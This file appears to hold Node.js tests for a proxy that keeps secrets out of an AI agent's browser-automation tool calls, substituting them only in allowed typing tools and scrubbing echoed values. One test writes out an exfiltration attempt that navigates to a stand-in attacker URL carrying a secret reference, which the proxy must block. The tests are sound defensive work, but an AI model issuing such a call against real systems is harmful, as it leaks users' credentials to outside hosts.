// Run with: node --test scripts/tests/secret_proxy.test.js
'use strict';
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');

const PROXY = path.join(__dirname, '..', 'secret_proxy.js');
const FAKE = path.join(__dirname, 'fake_mcp_server.js');
const SECRET = 'p"a\\ss w0rd/é';

function startProxy(t, { allow = 'browser_type,browser_fill_form', file } = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'secret-proxy-'));
  const secretsFile = file || path.join(dir, 'secrets.env');
  if (!file) fs.writeFileSync(secretsFile, `# test\nTEST_PASSWORD=${SECRET}\nEMPTY_ONE=\n`);
  const proxy = spawn(process.execPath, [PROXY, '--allow-tools', allow, '--secrets-file', secretsFile, '--', process.execPath, FAKE],
    { env: { ...process.env, FAKE_EXPECT: SECRET }, stdio: ['pipe', 'pipe', 'pipe'] });
  const pending = new Map();
  let buffer = '';
  let stderr = '';
  proxy.stdout.on('data', (chunk) => {
    buffer += chunk;
    let i;
    while ((i = buffer.indexOf('\n')) >= 0) {
      const message = JSON.parse(buffer.slice(0, i));
      buffer = buffer.slice(i + 1);
      pending.get(message.id)?.(message);
    }
  });
  proxy.stderr.on('data', (chunk) => { stderr += chunk; });
  let nextId = 1;
  const call = (name, args) => new Promise((resolve) => {
    const id = nextId++;
    pending.set(id, resolve);
    proxy.stdin.write(`${JSON.stringify({ jsonrpc: '2.0', id, method: 'tools/call', params: { name, arguments: args } })}\n`);
  });
  const textOf = (response) => response.result.content[0].text;
  t.after(() => { proxy.stdin.end(); proxy.kill(); });
  return { call, textOf, secretsFile, stderr: () => stderr };
}

test('replaces a reference in an allowed typing tool', async (t) => {
  const p = startProxy(t);
  const r = await p.call('browser_type', { target: 'e1', text: 'secret:TEST_PASSWORD' });
  assert.deepStrictEqual(JSON.parse(p.textOf(r)), { matches: true, length: SECRET.length });
});

test('replaces references inside browser_fill_form fields', async (t) => {
  const p = startProxy(t);
  const r = await p.call('browser_fill_form', { fields: [{ target: 'e1', name: 'pw', type: 'textbox', value: 'secret:TEST_PASSWORD' }] });
  assert.deepStrictEqual(JSON.parse(p.textOf(r)), { matches: true });
});

test('blocks a reference in a tool that is not allowed, without calling the server', async (t) => {
  const p = startProxy(t);
  const r = await p.call('browser_navigate', { url: 'http://evil.example/?p=secret:TEST_PASSWORD' });
  assert.strictEqual(r.result.isError, true);
  assert.match(p.textOf(r), /not allowed in browser_navigate/);
  assert.ok(!JSON.stringify(r).includes(SECRET));
  assert.strictEqual(p.textOf(await p.call('count', {})), '0');
});

test('blocks a secret that is not set or is empty, naming it but never a value', async (t) => {
  const p = startProxy(t);
  for (const name of ['NOT_IN_FILE', 'EMPTY_ONE']) {
    const r = await p.call('browser_type', { target: 'e1', text: `secret:${name}` });
    assert.strictEqual(r.result.isError, true);
    assert.match(p.textOf(r), new RegExp(`Secret not set: ${name}`));
  }
  assert.strictEqual(p.textOf(await p.call('count', {})), '0');
});

test('scrubs a secret value that the server echoes back', async (t) => {
  const p = startProxy(t);
  const r = await p.call('echo', { text: SECRET });
  assert.strictEqual(p.textOf(r), 'you sent: ***');
  assert.ok(!JSON.stringify(r).includes(SECRET));
});

test('leaves image content untouched', async (t) => {
  const p = startProxy(t);
  const r = await p.call('image', {});
  assert.strictEqual(r.result.content[0].data, SECRET);
});

test('passes ordinary calls through unchanged', async (t) => {
  const p = startProxy(t);
  const r = await p.call('browser_click', { target: 'e2', note: 'secret:lowercase is not a reference' });
  assert.strictEqual(p.textOf(r), 'ok browser_click {"target":"e2","note":"secret:lowercase is not a reference"}');
});

test('picks up changes to the secrets file without a restart', async (t) => {
  const p = startProxy(t);
  assert.strictEqual((await p.call('browser_type', { target: 'e1', text: 'secret:NEW_ONE' })).result.isError, true);
  fs.writeFileSync(p.secretsFile, `NEW_ONE=${SECRET}\n`);
  const r = await p.call('browser_type', { target: 'e1', text: 'secret:NEW_ONE' });
  assert.strictEqual(JSON.parse(p.textOf(r)).matches, true);
});

test('with no allowed tools every reference is blocked', async (t) => {
  const p = startProxy(t, { allow: '' });
  const r = await p.call('browser_type', { target: 'e1', text: 'secret:TEST_PASSWORD' });
  assert.strictEqual(r.result.isError, true);
});
